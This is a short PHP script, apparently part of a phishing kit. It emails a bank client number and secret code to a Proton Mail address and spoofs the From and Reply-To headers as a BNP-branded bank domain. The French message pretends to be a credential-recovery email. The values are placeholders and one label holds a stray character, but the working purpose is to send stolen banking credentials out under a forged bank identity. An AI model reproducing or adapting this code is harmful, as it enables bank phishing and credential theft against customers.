?php
$numeroClient = '123456';
$codeSecret = '123456';

$to = 'leskeute@proton.me';
$subject = 'Récupération de votre numéro client et code secret';
$message = 'Voici les informations que vous recherchez :' . "\n\n" .
            'Numéro clien<t : ' . $numeroClient . "\n" .
            'Code secret : ' . $codeSecret;

$headers = 'From: contact@mabanquebnp.com' . "\r\n" .
    'Reply-To: contact@mabanquebnp.com' . "\r\n" .
    'X-Mailer: PHP/' . phpversion();

if(mail($to, $subject, $message, $headers)) {
    echo 'Vos informations ont été envoyées avec succès.';
} else {
    echo 'Une erreur s\'est produite lors de l\'envoi des informations.';
}
?>
